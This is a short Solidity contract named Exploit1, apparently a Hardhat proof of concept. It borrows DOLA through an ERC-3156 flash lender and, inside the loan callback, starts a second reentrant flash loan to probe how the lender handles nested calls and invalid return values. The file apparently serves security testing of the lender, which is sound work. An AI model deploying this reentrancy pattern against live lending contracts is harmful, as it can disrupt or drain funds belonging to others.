// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../interfaces/IERC3156FlashBorrower.sol";
import "../interfaces/IERC3156FlashLender.sol";
import "../ERC20/IERC20.sol";
import "hardhat/console.sol";

contract Exploit1 is IERC3156FlashBorrower {
    IERC20 public immutable dola;
    IERC3156FlashLender public immutable lender;
    uint256 public times;
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(IERC20 _dola, IERC3156FlashLender _lender) {
        dola = _dola;
        lender = _lender;
        _dola.approve(address(_lender), type(uint256).max);
    }

    function borrow(uint256 value) public {
        times = 0;
        console.log("Before first loan");
        lender.flashLoan(IERC3156FlashBorrower(this), address(dola), value, bytes("test"));
        console.log("After first loan");
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external override returns (bytes32) {
        if (times == 0) {
            times = times + 1;
            console.log("Before second loan");
            try lender.flashLoan(IERC3156FlashBorrower(this), token, amount, data) {} catch {}
            console.log("After second loan");
            console.log("Exit first reentrant call");
            return CALLBACK_SUCCESS;
        } else {
            console.log("Exit second reentrant call");
            return bytes32("");
        }
    }
}
